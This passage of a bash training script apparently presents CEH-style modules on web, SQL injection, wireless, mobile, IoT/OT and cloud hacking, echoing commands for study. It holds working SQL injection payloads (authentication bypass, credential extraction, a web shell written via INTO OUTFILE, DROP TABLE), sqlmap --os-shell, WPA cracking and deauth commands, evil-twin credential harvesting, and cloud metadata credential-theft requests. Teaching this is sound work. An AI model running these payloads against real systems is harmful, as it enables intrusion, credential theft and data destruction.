    echo -e "${GREEN}# Start OWASP ZAP${NC}"
    echo -e "zaproxy"
    echo -e "\n${GREEN}# Automated scan${NC}"
    echo -e "# File > New Session"
    echo -e "# Enter target URL"
    echo -e "# Attack > Active Scan"
    echo -e "\n${GREEN}# Manual testing${NC}"
    echo -e "# Use manual request editor"
    echo -e "# Analyze scan results"
    
    echo -e "\n${WHITE}💻 PARAMETER MANIPULATION:${NC}"
    echo -e "${GREEN}# Hidden parameter discovery${NC}"
    echo -e "arjun -u http://target.com/page.php"
    echo -e "\n${GREEN}# Parameter pollution${NC}"
    echo -e "?param=value1&param=value2"
    echo -e "\n${GREEN}# HTTP Parameter Pollution${NC}"
    echo -e "curl 'http://target.com/search?q=test&q=admin'"
    
    echo -e "\n${WHITE}🛠️ SPECIALIZED TOOLS:${NC}"
    echo -e "• ${CYAN}SQLmap${NC}: SQL injection exploitation"
    echo -e "• ${CYAN}Commix${NC}: Command injection exploitation"
    echo -e "• ${CYAN}XSSer${NC}: Cross-site scripting exploitation"
    echo -e "• ${CYAN}NoSQLMap${NC}: NoSQL injection testing"
    echo -e "• ${CYAN}Wfuzz${NC}: Web application fuzzer\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 14
}

# Module 15: SQL Injection
module_15() {
    show_header
    echo -e "${BLUE}=== MODULE 15: SQL INJECTION ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "SQL injection is a code injection technique that exploits vulnerabilities"
    echo -e "in an application's software when user input is not properly sanitized.\n"
    
    echo -e "${WHITE}🎯 INJECTION TYPES:${NC}"
    echo -e "• ${RED}In-band${NC}: Results displayed directly"
    echo -e "  - Union-based: Using UNION operator"
    echo -e "  - Error-based: Using database errors"
    echo -e "• ${RED}Blind${NC}: No direct output"
    echo -e "  - Boolean-based: True/false responses"
    echo -e "  - Time-based: Response time delays"
    echo -e "• ${RED}Out-of-band${NC}: Using different channels\n"
    
    echo -e "${WHITE}💻 BASIC SQL INJECTION:${NC}"
    echo -e "${GREEN}# Authentication bypass${NC}"
    echo -e "' OR '1'='1"
    echo -e "admin'--"
    echo -e "' OR 1=1#"
    echo -e "') OR ('1'='1"
    echo -e "\n${GREEN}# Testing for vulnerability${NC}"
    echo -e "'"
    echo -e "''"
    echo -e "' AND '1'='1"
    echo -e "' AND '1'='2"
    echo -e "\n${GREEN}# Comment variations${NC}"
    echo -e "-- (SQL Server, PostgreSQL)"
    echo -e "# (MySQL)"
    echo -e "/* */ (Multi-line comment)"
    
    echo -e "\n${WHITE}💻 UNION-BASED INJECTION:${NC}"
    echo -e "${GREEN}# Determine number of columns${NC}"
    echo -e "' ORDER BY 1--"
    echo -e "' ORDER BY 2--"
    echo -e "' ORDER BY 3--"
    echo -e "\n${GREEN}# Alternative column counting${NC}"
    echo -e "' UNION SELECT NULL--"
    echo -e "' UNION SELECT NULL,NULL--"
    echo -e "' UNION SELECT NULL,NULL,NULL--"
    echo -e "\n${GREEN}# Extract data${NC}"
    echo -e "' UNION SELECT user(),version(),database()--"
    echo -e "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--"
    echo -e "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--"
    echo -e "' UNION SELECT username,password,NULL FROM users--"
    
    echo -e "\n${WHITE}💻 ERROR-BASED INJECTION:${NC}"
    echo -e "${GREEN}# MySQL error-based${NC}"
    echo -e "' AND extractvalue(1,concat(0x7e,version(),0x7e))--"
    echo -e "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    echo -e "\n${GREEN}# SQL Server error-based${NC}"
    echo -e "' AND 1=CONVERT(int,@@version)--"
    echo -e "' AND 1=CAST(user_name() AS int)--"
    echo -e "\n${GREEN}# PostgreSQL error-based${NC}"
    echo -e "' AND CAST(version() AS int)=1--"
    
    echo -e "\n${WHITE}💻 BLIND SQL INJECTION:${NC}"
    echo -e "${GREEN}# Boolean-based blind${NC}"
    echo -e "' AND (SELECT SUBSTRING(user(),1,1)='r')--"
    echo -e "' AND (SELECT COUNT(*) FROM users)>0--"
    echo -e "' AND ASCII(SUBSTRING(database(),1,1))>97--"
    echo -e "\n${GREEN}# Time-based blind${NC}"
    echo -e "' AND (SELECT SLEEP(5))--"
    echo -e "' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--"
    echo -e "'; WAITFOR DELAY '00:00:05'--"
    echo -e "' AND (SELECT pg_sleep(5))--"
    
    echo -e "\n${WHITE}💻 SQLMAP AUTOMATION:${NC}"
    echo -e "${GREEN}# Basic SQLmap scan${NC}"
    echo -e "sqlmap -u 'http://target.com/page.php?id=1'"
    echo -e "\n${GREEN}# POST data injection${NC}"
    echo -e "sqlmap -u 'http://target.com/login.php' --data 'username=admin&password=test'"
    echo -e "\n${GREEN}# Cookie injection${NC}"
    echo -e "sqlmap -u 'http://target.com/page.php' --cookie 'id=1'"
    echo -e "\n${GREEN}# Advanced options${NC}"
    echo -e "sqlmap -u 'http://target.com/page.php?id=1' --dbs --tables --columns --dump"
    echo -e "sqlmap -u 'http://target.com/page.php?id=1' --os-shell"
    echo -e "sqlmap -u 'http://target.com/page.php?id=1' --sql-shell"
    
    echo -e "\n${WHITE}💻 DATABASE-SPECIFIC PAYLOADS:${NC}"
    echo -e "${GREEN}# MySQL${NC}"
    echo -e "SELECT @@version"
    echo -e "SELECT user()"
    echo -e "SELECT database()"
    echo -e "LOAD_FILE('/etc/passwd')"
    echo -e "INTO OUTFILE '/var/www/shell.php'"
    echo -e "\n${GREEN}# SQL Server${NC}"
    echo -e "SELECT @@version"
    echo -e "SELECT user_name()"
    echo -e "SELECT db_name()"
    echo -e "xp_cmdshell 'whoami'"
    echo -e "\n${GREEN}# Oracle${NC}"
    echo -e "SELECT banner FROM v\$version"
    echo -e "SELECT user FROM dual"
    echo -e "SELECT name FROM v\$database"
    echo -e "\n${GREEN}# PostgreSQL${NC}"
    echo -e "SELECT version()"
    echo -e "SELECT current_user"
    echo -e "SELECT current_database()"
    
    echo -e "\n${WHITE}💻 SECOND-ORDER INJECTION:${NC}"
    echo -e "${GREEN}# Stored payload${NC}"
    echo -e "# Register user: admin'--"
    echo -e "# Payload executes when admin data is used"
    echo -e "\n${GREEN}# Profile update injection${NC}"
    echo -e "# Update profile with: '; DROP TABLE users;--"
    
    echo -e "\n${WHITE}🛡️ PREVENTION TECHNIQUES:${NC}"
    echo -e "• Use parameterized queries/prepared statements"
    echo -e "• Input validation and sanitization"
    echo -e "• Principle of least privilege for database accounts"
    echo -e "• Web Application Firewalls (WAF)"
    echo -e "• Regular security code reviews\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 15
}

# Module 16: Hacking Wireless Networks
module_16() {
    show_header
    echo -e "${BLUE}=== MODULE 16: HACKING WIRELESS NETWORKS ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "Wireless network hacking involves exploiting vulnerabilities in Wi-Fi"
    echo -e "protocols, encryption, and configurations to gain unauthorized access.\n"
    
    echo -e "${WHITE}📡 WIRELESS STANDARDS:${NC}"
    echo -e "• ${GREEN}802.11a/b/g/n/ac/ax${NC}: Wi-Fi standards"
    echo -e "• ${GREEN}WEP${NC}: Wired Equivalent Privacy (deprecated)"
    echo -e "• ${GREEN}WPA/WPA2${NC}: Wi-Fi Protected Access"
    echo -e "• ${GREEN}WPA3${NC}: Latest Wi-Fi security protocol"
    echo -e "• ${GREEN}WPS${NC}: Wi-Fi Protected Setup\n"
    
    echo -e "${WHITE}💻 WIRELESS INTERFACE SETUP:${NC}"
    echo -e "${GREEN}# Check wireless interfaces${NC}"
    echo -e "iwconfig"
    echo -e "ip link show"
    echo -e "\n${GREEN}# Enable monitor mode${NC}"
    echo -e "sudo airmon-ng start wlan0"
    echo -e "sudo ip link set wlan0 down"
    echo -e "sudo iw wlan0 set monitor control"
    echo -e "sudo ip link set wlan0 up"
    echo -e "\n${GREEN}# Check monitor mode${NC}"
    echo -e "iwconfig wlan0mon"
    echo -e "\n${GREEN}# Kill interfering processes${NC}"
    echo -e "sudo airmon-ng check kill"
    
    echo -e "\n${WHITE}💻 NETWORK DISCOVERY:${NC}"
    echo -e "${GREEN}# Scan for networks${NC}"
    echo -e "sudo airodump-ng wlan0mon"
    echo -e "\n${GREEN}# Scan specific channel${NC}"
    echo -e "sudo airodump-ng -c 6 wlan0mon"
    echo -e "\n${GREEN}# Save scan results${NC}"
    echo -e "sudo airodump-ng -w scan_results wlan0mon"
    echo -e "\n${GREEN}# Show hidden SSIDs${NC}"
    echo -e "sudo airodump-ng --beacons wlan0mon"
    
    echo -e "\n${WHITE}💻 WEP CRACKING:${NC}"
    echo -e "${GREEN}# Capture WEP traffic${NC}"
    echo -e "sudo airodump-ng -c 6 --bssid [BSSID] -w wep_capture wlan0mon"
    echo -e "\n${GREEN}# Generate traffic (ARP replay)${NC}"
    echo -e "sudo aireplay-ng -3 -b [BSSID] -h [CLIENT_MAC] wlan0mon"
    echo -e "\n${GREEN}# Crack WEP key${NC}"
    echo -e "sudo aircrack-ng wep_capture-01.cap"
    echo -e "\n${GREEN}# Fake authentication${NC}"
    echo -e "sudo aireplay-ng -1 0 -a [BSSID] -h [YOUR_MAC] wlan0mon"
    
    echo -e "\n${WHITE}💻 WPA/WPA2 CRACKING:${NC}"
    echo -e "${GREEN}# Capture handshake${NC}"
    echo -e "sudo airodump-ng -c 6 --bssid [BSSID] -w wpa_handshake wlan0mon"
    echo -e "\n${GREEN}# Deauth attack to capture handshake${NC}"
    echo -e "sudo aireplay-ng -0 5 -a [BSSID] -c [CLIENT_MAC] wlan0mon"
    echo -e "\n${GREEN}# Crack with wordlist${NC}"
    echo -e "sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_handshake-01.cap"
    echo -e "\n${GREEN}# Hashcat WPA cracking${NC}"
    echo -e "hcxpcapngtool -o hash.hc22000 wpa_handshake-01.cap"
    echo -e "hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt"
    
    echo -e "\n${WHITE}💻 WPS ATTACKS:${NC}"
    echo -e "${GREEN}# Scan for WPS${NC}"
    echo -e "sudo wash -i wlan0mon"
    echo -e "\n${GREEN}# Reaver WPS attack${NC}"
    echo -e "sudo reaver -i wlan0mon -b [BSSID] -vv"
    echo -e "\n${GREEN}# Bully WPS attack${NC}"
    echo -e "sudo bully -b [BSSID] -c [CHANNEL] wlan0mon"
    echo -e "\n${GREEN}# WPS PIN attack${NC}"
    echo -e "sudo reaver -i wlan0mon -b [BSSID] -p [PIN] -vv"
    
    echo -e "\n${WHITE}💻 EVIL TWIN ATTACK:${NC}"
    echo -e "${GREEN}# Create rogue AP with hostapd${NC}"
    echo -e "sudo hostapd /etc/hostapd/hostapd.conf"
    echo -e "\n${GREEN}# DHCP server${NC}"
    echo -e "sudo dnsmasq -C /etc/dnsmasq.conf"
    echo -e "\n${GREEN}# WiFi Pineapple simulation${NC}"
    echo -e "sudo create_ap wlan0 eth0 'Free WiFi' --no-virt"
    echo -e "\n${GREEN}# Capture credentials${NC}"
    echo -e "# Set up captive portal to harvest credentials"
    
    echo -e "\n${WHITE}💻 ADVANCED ATTACKS:${NC}"
    echo -e "${GREEN}# PMKID attack (WPA2)${NC}"
    echo -e "sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1"
    echo -e "hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng"
    echo -e "hashcat -m 22000 pmkid.hc22000 wordlist.txt"
    echo -e "\n${GREEN}# Krack attack simulation${NC}"
    echo -e "# Key reinstallation attack testing"
    echo -e "python3 krackattack.py [interface] [target]"
    echo -e "\n${GREEN}# Bluetooth attacks${NC}"
    echo -e "hcitool scan"
    echo -e "bluerecon -i hci0"
    
    echo -e "\n${WHITE}🛠️ WIRELESS TOOLS:${NC}"
    echo -e "• ${CYAN}Aircrack-ng suite${NC}: Complete wireless auditing"
    echo -e "• ${CYAN}Wifite${NC}: Automated wireless attack tool"
    echo -e "• ${CYAN}Fluxion${NC}: WPA/WPA2 security testing"
    echo -e "• ${CYAN}WiFi Pineapple${NC}: Wireless penetration testing platform"
    echo -e "• ${CYAN}Kismet${NC}: Wireless network detector and sniffer\n"
    
    echo -e "${WHITE}🛡️ WIRELESS SECURITY:${NC}"
    echo -e "• Use WPA3 encryption when available"
    echo -e "• Disable WPS if not needed"
    echo -e "• Use strong passphrases (12+ characters)"
    echo -e "• Enable MAC address filtering"
    echo -e "• Regularly update router firmware\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 16
}

# Module 17: Hacking Mobile Platforms
module_17() {
    show_header
    echo -e "${BLUE}=== MODULE 17: HACKING MOBILE PLATFORMS ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "Mobile platform hacking involves exploiting vulnerabilities in mobile"
    echo -e "devices, applications, and communications to gain unauthorized access.\n"
    
    echo -e "${WHITE}📱 MOBILE PLATFORMS:${NC}"
    echo -e "• ${GREEN}Android${NC}: Google's mobile OS (Linux-based)"
    echo -e "• ${GREEN}iOS${NC}: Apple's mobile OS"
    echo -e "• ${GREEN}Windows Mobile${NC}: Microsoft's mobile OS (deprecated)"
    echo -e "• ${GREEN}BlackBerry${NC}: Enterprise-focused mobile OS\n"
    
    echo -e "${WHITE}💻 ANDROID PENETRATION TESTING:${NC}"
    echo -e "${GREEN}# ADB (Android Debug Bridge)${NC}"
    echo -e "adb devices"
    echo -e "adb shell"
    echo -e "adb install app.apk"
    echo -e "adb pull /sdcard/file.txt"
    echo -e "adb push file.txt /sdcard/"
    echo -e "\n${GREEN}# APK analysis${NC}"
    echo -e "aapt dump badging app.apk"
    echo -e "aapt list app.apk"
    echo -e "\n${GREEN}# Decompile APK${NC}"
    echo -e "apktool d app.apk"
    echo -e "jadx-gui app.apk"
    echo -e "dex2jar app.apk"
    echo -e "\n${GREEN}# Static analysis${NC}"
    echo -e "grep -r 'password' ."
    echo -e "grep -r 'api_key' ."
    echo -e "find . -name '*.xml' -exec grep -l 'android:exported=\"true\"' {} \\;"
    
    echo -e "\n${WHITE}💻 DYNAMIC ANALYSIS:${NC}"
    echo -e "${GREEN}# Frida for runtime manipulation${NC}"
    echo -e "frida-ps -U"
    echo -e "frida -U -l script.js com.example.app"
    echo -e "\n${GREEN}# Objection (Frida toolkit)${NC}"
    echo -e "objection -g com.example.app explore"
    echo -e "android sslpinning disable"
    echo -e "android clipboard monitor"
    echo -e "\n${GREEN}# MobSF (Mobile Security Framework)${NC}"
    echo -e "# Upload APK to MobSF web interface"
    echo -e "# Automated static and dynamic analysis"
    echo -e "\n${GREEN}# Drozer${NC}"
    echo -e "drozer console connect"
    echo -e "run app.package.list"
    echo -e "run app.package.info -a com.example.app"
    
    echo -e "\n${WHITE}💻 iOS PENETRATION TESTING:${NC}"
    echo -e "${GREEN}# iProxy for device communication${NC}"
    echo -e "iproxy 2222 22"
    echo -e "ssh root@localhost -p 2222"
    echo -e "\n${GREEN}# Cycript for runtime manipulation${NC}"
    echo -e "cycript -p [process_name]"
    echo -e "UIApp.keyWindow.recursiveDescription().toString()"
    echo -e "\n${GREEN}# iOS App analysis${NC}"
    echo -e "class-dump-z app.app/app"
    echo -e "strings app.app/app | grep -i password"
    echo -e "otool -L app.app/app"
    echo -e "\n${GREEN}# Keychain analysis${NC}"
    echo -e "# Use Keychain-Dumper on jailbroken devices"
    echo -e "./keychain_dumper"
    
    echo -e "\n${WHITE}💻 MOBILE MALWARE ANALYSIS:${NC}"
    echo -e "${GREEN}# VirusTotal mobile app scanning${NC}"
    echo -e "curl -X POST 'https://www.virustotal.com/vtapi/v2/file/scan' -F 'file=@app.apk' -F 'apikey=YOUR_API_KEY'"
    echo -e "\n${GREEN}# Hybrid Analysis${NC}"
    echo -e "# Submit APK to Hybrid Analysis sandbox"
    echo -e "\n${GREEN}# YARA rules for mobile malware${NC}"
    echo -e "yara mobile_malware.yar app.apk"
    echo -e "\n${GREEN}# Cuckoo Droid${NC}"
    echo -e "# Android malware analysis with Cuckoo"
    
    echo -e "\n${WHITE}💻 MOBILE DEVICE MANAGEMENT:${NC}"
    echo -e "${GREEN}# Check for MDM${NC}"
    echo -e "# iOS: Settings > General > Device Management"
    echo -e "# Android: Settings > Security > Device Administrators"
    echo -e "\n${GREEN}# Bypass MDM restrictions${NC}"
    echo -e "# Various techniques depending on MDM solution"
    echo -e "# Root/jailbreak may be required"
    
    echo -e "\n${WHITE}💻 NETWORK ATTACKS:${NC}"
    echo -e "${GREEN}# Man-in-the-middle${NC}"
    echo -e "mitmproxy -s intercept_mobile.py"
    echo -e "bettercap -iface wlan0"
    echo -e "\n${GREEN}# SSL Kill Switch${NC}"
    echo -e "# iOS: Install SSL Kill Switch 2 on jailbroken device"
    echo -e "# Android: Use Frida scripts or Xposed modules"
    echo -e "\n${GREEN}# Fake base stations${NC}"
    echo -e "# IMSI catchers for cellular interception"
    echo -e "# Educational simulation only"
    
    echo -e "\n${WHITE}💻 SOCIAL ENGINEERING:${NC}"
    echo -e "${GREEN}# Malicious apps${NC}"
    echo -e "# Create legitimate-looking apps with hidden functionality"
    echo -e "# Distribute through alternative app stores"
    echo -e "\n${GREEN}# SMS phishing${NC}"
    echo -e "# Craft convincing SMS messages with malicious links"
    echo -e "# Use URL shorteners to hide destinations"
    echo -e "\n${GREEN}# Fake WiFi hotspots${NC}"
    echo -e "# Set up rogue access points"
    echo -e "# Target mobile devices in public areas"
    
    echo -e "\n${WHITE}🛠️ MOBILE TESTING TOOLS:${NC}"
    echo -e "• ${CYAN}MobSF${NC}: Mobile Security Framework"
    echo -e "• ${CYAN}Frida${NC}: Dynamic instrumentation toolkit"
    echo -e "• ${CYAN}Objection${NC}: Runtime mobile exploration"
    echo -e "• ${CYAN}APKTool${NC}: APK reverse engineering"
    echo -e "• ${CYAN}Drozer${NC}: Android security testing framework"
    echo -e "• ${CYAN}iOSSecAudit${NC}: iOS security audit tool\n"
    
    echo -e "${WHITE}🛡️ MOBILE SECURITY BEST PRACTICES:${NC}"
    echo -e "• Keep OS and apps updated"
    echo -e "• Use strong device passcodes/biometrics"
    echo -e "• Enable device encryption"
    echo -e "• Install apps only from official stores"
    echo -e "• Be cautious with public Wi-Fi"
    echo -e "• Implement mobile application management (MAM)\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 17
}

# Module 18: IoT and OT Hacking
module_18() {
    show_header
    echo -e "${BLUE}=== MODULE 18: IOT AND OT HACKING ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "Internet of Things (IoT) and Operational Technology (OT) hacking involves"
    echo -e "exploiting connected devices and industrial control systems.\n"
    
    echo -e "${WHITE}🌐 IOT ECOSYSTEM:${NC}"
    echo -e "• ${GREEN}Smart Home${NC}: Cameras, thermostats, lights"
    echo -e "• ${GREEN}Wearables${NC}: Fitness trackers, smartwatches"
    echo -e "• ${GREEN}Industrial IoT${NC}: Sensors, controllers, gateways"
    echo -e "• ${GREEN}Smart Cities${NC}: Traffic lights, parking meters"
    echo -e "• ${GREEN}Healthcare IoT${NC}: Medical devices, monitors\n"
    
    echo -e "${WHITE}🏭 OT SYSTEMS:${NC}"
    echo -e "• ${BLUE}SCADA${NC}: Supervisory Control and Data Acquisition"
    echo -e "• ${BLUE}PLC${NC}: Programmable Logic Controllers"
    echo -e "• ${BLUE}HMI${NC}: Human Machine Interface"
    echo -e "• ${BLUE}DCS${NC}: Distributed Control Systems"
    echo -e "• ${BLUE}ICS${NC}: Industrial Control Systems\n"
    
    echo -e "${WHITE}💻 IOT RECONNAISSANCE:${NC}"
    echo -e "${GREEN}# Shodan for IoT device discovery${NC}"
    echo -e "shodan search 'default password'"
    echo -e "shodan search 'title:\"IP Camera\"'"
    echo -e "shodan search 'port:23 telnet'"
    echo -e "shodan search 'Server: lighttpd/1.4'"
    echo -e "\n${GREEN}# Censys search${NC}"
    echo -e "# Search for IoT devices by certificates, banners"
    echo -e "\n${GREEN}# Nmap IoT scanning${NC}"
    echo -e "nmap -sS -O --script vuln 192.168.1.0/24"
    echo -e "nmap --script broadcast-dhcp-discover"
    echo -e "nmap --script upnp-info 192.168.1.0/24"
    
    echo -e "\n${WHITE}💻 IOT PROTOCOLS:${NC}"
    echo -e "${GREEN}# MQTT testing${NC}"
    echo -e "mosquitto_sub -h target.com -t '#' -v"
    echo -e "mosquitto_pub -h target.com -t 'topic' -m 'malicious_message'"
    echo -e "\n${GREEN}# CoAP testing${NC}"
    echo -e "coap-client -m get coap://target.com/.well-known/core"
    echo -e "\n${GREEN}# ModBus testing${NC}"
    echo -e "nmap --script modbus-discover target.com"
    echo -e "python3 modbus_scanner.py target.com"
    echo -e "\n${GREEN}# BLE (Bluetooth Low Energy)${NC}"
    echo -e "hcitool lescan"
    echo -e "gatttool -b [MAC] --primary"
    echo -e "bettercap -iface hci0"
    
    echo -e "\n${WHITE}💻 FIRMWARE ANALYSIS:${NC}"
    echo -e "${GREEN}# Extract firmware${NC}"
    echo -e "binwalk -e firmware.bin"
    echo -e "firmware-mod-kit/extract-firmware.sh firmware.bin"
    echo -e "\n${GREEN}# Analyze file system${NC}"
    echo -e "find . -name '*.conf' -exec grep -l password {} \\;"
    echo -e "strings firmware.bin | grep -i password"
    echo -e "hexdump -C firmware.bin | grep -i admin"
    echo -e "\n${GREEN}# QEMU emulation${NC}"
    echo -e "qemu-system-arm -M versatilepb -kernel kernel -hda rootfs.img -append 'root=/dev/sda'"
    echo -e "\n${GREEN}# Firmware vulnerability scanning${NC}"
    echo -e "firmware-slap firmware.bin"
    echo -e "emba firmware.bin"
    
    echo -e "\n${WHITE}💻 HARDWARE ATTACKS:${NC}"
    echo -e "${GREEN}# UART/Serial access${NC}"
    echo -e "screen /dev/ttyUSB0 115200"
    echo -e "minicom -D /dev/ttyUSB0 -b 115200"
    echo -e "\n${GREEN}# JTAG debugging${NC}"
    echo -e "openocd -f interface/jtagkey.cfg -f target/target.cfg"
    echo -e "\n${GREEN}# SPI flash reading${NC}"
    echo -e "flashrom -p linux_spi:dev=/dev/spidev0.0 -r firmware_dump.bin"
    echo -e "\n${GREEN}# I2C communication${NC}"
    echo -e "i2cdetect -y 1"
    echo -e "i2cdump -y 1 0x48"
    
    echo -e "\n${WHITE}💻 INDUSTRIAL CONTROL SYSTEMS:${NC}"
    echo -e "${GREEN}# SCADA enumeration${NC}"
    echo -e "nmap -Pn -sS --script s7-info 192.168.1.100"
    echo -e "nmap --script modbus-discover,modbus-info target"
    echo -e "\n${GREEN}# DNP3 protocol testing${NC}"
    echo -e "nmap --script dnp3-info target.com"
    echo -e "\n${GREEN}# ICS identification${NC}"
    echo -e "python3 plcscan.py 192.168.1.0/24"
    echo -e "nmap --script ics-* target_range"
    echo -e "\n${GREEN}# Metasploit ICS modules${NC}"
    echo -e "use auxiliary/scanner/scada/modbusclient"
    echo -e "use auxiliary/scanner/scada/digi_realport_serialport_scan"
    
    echo -e "\n${WHITE}💻 IOT BOTNET ANALYSIS:${NC}"
    echo -e "${GREEN}# Mirai botnet indicators${NC}"
    echo -e "netstat -tulpn | grep :23"
    echo -e "ps aux | grep -E '(busybox|dropbear)'"
    echo -e "\n${GREEN}# Network traffic analysis${NC}"
    echo -e "tcpdump -i any -w iot_traffic.pcap port 23 or port 2323"
    echo -e "wireshark iot_traffic.pcap"
    echo -e "\n${GREEN}# Honeypot deployment${NC}"
    echo -e "cowrie # SSH/Telnet honeypot"
    echo -e "conpot # ICS/SCADA honeypot"
    
    echo -e "\n${WHITE}🛠️ IOT/OT TESTING TOOLS:${NC}"
    echo -e "• ${CYAN}IoT Inspector${NC}: IoT device security analysis"
    echo -e "• ${CYAN}Routersploit${NC}: Router exploitation framework"
    echo -e "• ${CYAN}Firmwalker${NC}: Firmware analysis tool"
    echo -e "• ${CYAN}Binwalk${NC}: Firmware analysis toolkit"
    echo -e "• ${CYAN}FACT${NC}: Firmware Analysis and Comparison Tool"
    echo -e "• ${CYAN}ICS-CERT Tools${NC}: Industrial control system security\n"
    
    echo -e "${WHITE}🛡️ IOT/OT SECURITY MEASURES:${NC}"
    echo -e "• Change default credentials immediately"
    echo -e "• Implement network segmentation"
    echo -e "• Regular firmware updates"
    echo -e "• Monitor network traffic for anomalies"
    echo -e "• Implement access controls and authentication"
    echo -e "• Use VPNs for remote access\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 18
}

# Module 19: Cloud Computing
module_19() {
    show_header
    echo -e "${BLUE}=== MODULE 19: CLOUD COMPUTING ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "Cloud computing security involves understanding and exploiting"
    echo -e "vulnerabilities in cloud services, configurations, and implementations.\n"
    
    echo -e "${WHITE}☁️ CLOUD SERVICE MODELS:${NC}"
    echo -e "• ${GREEN}IaaS${NC}: Infrastructure as a Service (EC2, VMs)"
    echo -e "• ${GREEN}PaaS${NC}: Platform as a Service (App Engine, Heroku)"
    echo -e "• ${GREEN}SaaS${NC}: Software as a Service (Office 365, Salesforce)"
    echo -e "• ${GREEN}FaaS${NC}: Function as a Service (Lambda, Azure Functions)\n"
    
    echo -e "${WHITE}🏢 CLOUD PROVIDERS:${NC}"
    echo -e "• ${BLUE}AWS${NC}: Amazon Web Services"
    echo -e "• ${BLUE}Azure${NC}: Microsoft Azure"
    echo -e "• ${BLUE}GCP${NC}: Google Cloud Platform"
    echo -e "• ${BLUE}OCI${NC}: Oracle Cloud Infrastructure\n"
    
    echo -e "${WHITE}💻 AWS SECURITY TESTING:${NC}"
    echo -e "${GREEN}# AWS CLI configuration${NC}"
    echo -e "aws configure"
    echo -e "aws sts get-caller-identity"
    echo -e "\n${GREEN}# S3 bucket enumeration${NC}"
    echo -e "aws s3 ls"
    echo -e "aws s3 ls s3://bucket-name --recursive"
    echo -e "\n${GREEN}# Public S3 bucket scanning${NC}"
    echo -e "aws s3 ls s3://company-backups --no-sign-request"
    echo -e "aws s3 cp s3://public-bucket/file.txt . --no-sign-request"
    echo -e "\n${GREEN}# EC2 instance metadata${NC}"
    echo -e "curl http://169.254.169.254/latest/meta-data/"
    echo -e "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    echo -e "\n${GREEN}# IAM enumeration${NC}"
    echo -e "aws iam list-users"
    echo -e "aws iam list-roles"
    echo -e "aws iam get-account-summary"
    
    echo -e "\n${WHITE}💻 AZURE SECURITY TESTING:${NC}"
    echo -e "${GREEN}# Azure CLI${NC}"
    echo -e "az login"
    echo -e "az account show"
    echo -e "\n${GREEN}# Storage account enumeration${NC}"
    echo -e "az storage account list"
    echo -e "az storage blob list --account-name storageaccount --container-name container"
    echo -e "\n${GREEN}# Azure AD enumeration${NC}"
    echo -e "az ad user list"
    echo -e "az ad group list"
    echo -e "\n${GREEN}# VM metadata${NC}"
    echo -e "curl -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"
    echo -e "\n${GREEN}# Resource enumeration${NC}"
    echo -e "az resource list"
    echo -e "az vm list"
    
    echo -e "\n${WHITE}💻 GCP SECURITY TESTING:${NC}"
    echo -e "${GREEN}# gcloud CLI${NC}"
    echo -e "gcloud auth login"
    echo -e "gcloud config list"
    echo -e "\n${GREEN}# Storage bucket enumeration${NC}"
    echo -e "gsutil ls"
    echo -e "gsutil ls gs://bucket-name"
    echo -e "\n${GREEN}# Compute instance metadata${NC}"
    echo -e "curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/"
    echo -e "\n${GREEN}# IAM enumeration${NC}"
    echo -e "gcloud iam service-accounts list"
    echo -e "gcloud projects get-iam-policy [PROJECT-ID]"
    
    echo -e "\n${WHITE}💻 CONTAINER SECURITY:${NC}"
    echo -e "${GREEN}# Docker enumeration${NC}"
    echo -e "docker ps -a"
    echo -e "docker images"
    echo -e "docker inspect [container_id]"
    echo -e "\n${GREEN}# Container escape${NC}"
    echo -e "# Check for privileged containers"
    echo -e "cat /proc/self/status | grep CapEff"
    echo -e "# Mount host filesystem"
    echo -e "mount /dev/sda1 /mnt"
    echo -e "\n${GREEN}# Kubernetes enumeration${NC}"
    echo -e "kubectl get pods --all-namespaces"
    echo -e "kubectl get secrets --all-namespaces"
    echo -e "kubectl auth can-i --list"
    
    echo -e "\n${WHITE}💻 SERVERLESS ATTACKS:${NC}"
    echo -e "${GREEN}# Lambda function enumeration${NC}"
    echo -e "aws lambda list-functions"
    echo -e "aws lambda get-function --function-name function-name"
    echo -e "\n${GREEN}# Event injection${NC}"
    echo -e "# Craft malicious events to trigger functions"
    echo -e "aws lambda invoke --function-name target-function --payload file://malicious-event.json response.json"
    echo -e "\n${GREEN}# Environment variable extraction${NC}"
    echo -e "# Access sensitive data in environment variables"
    echo -e "import os; print(os.environ)"
    
    echo -e "\n${WHITE}💻 CLOUD ENUMERATION TOOLS:${NC}"
    echo -e "${GREEN}# CloudMapper${NC}"
    echo -e "python3 cloudmapper.py prepare --config config.json --account 123456789012"
    echo -e "python3 cloudmapper.py collect --config config.json --account 123456789012"
    echo -e "\n${GREEN}# ScoutSuite${NC}"
    echo -e "scout --provider aws --profile default"
    echo -e "scout --provider azure --cli"
    echo -e "\n${GREEN}# Pacu (AWS exploitation framework)${NC}"
    echo -e "pacu"
    echo -e "import_keys --all"
    echo -e "run iam__enum_users_roles_policies_groups"
    echo -e "\n${GREEN}# Cloudsplaining${NC}"
    echo -e "cloudsplaining download --profile default"
